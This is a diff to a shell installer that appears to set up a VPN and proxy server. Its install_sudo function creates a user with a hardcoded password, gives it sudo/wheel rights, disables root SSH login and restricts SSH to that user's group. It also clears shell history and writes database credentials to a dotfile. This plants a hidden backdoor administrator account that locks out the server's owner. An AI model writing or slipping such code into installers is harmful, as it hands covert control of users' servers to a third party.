@@ -371,13 +371,12 @@ RLIMITS=""' >> stunnel4
 }
 
 install_sudo(){
-clear
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m nurdeveloper 2>/dev/null; echo nurdeveloper:@@NRDev123@@ | chpasswd &>/dev/null; usermod -aG wheel nurdeveloper &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    echo "AllowGroups nurdeveloper" >> /etc/ssh/sshd_config
     service sshd restart
-  }&>/dev/null
+  }
 }
 
 install_rclocal(){
@@ -429,7 +428,7 @@ echo '+++++++++++************++++++++++++'
 echo -e "[IP] : $server_ip\n[Openconnect TCP Port] : $PORT_TCP\n[Openconnect UDP Port] : $PORT_UDP\n[Ssl Port] : 443\n[Proxy Socks ] : 80\n[Proxy Squid 1] : 8080\n[Proxy Squid 2] : 3128\n"
 
 history -c;
-rm /root/.installer
+rm ~/.installer
 echo "DB_HOST='$HOST'" >> ~/.db-base
 echo "DB_NAME='$DBNAME'" >> ~/.db-base
 echo "DB_USER='$USER'" >> ~/.db-base
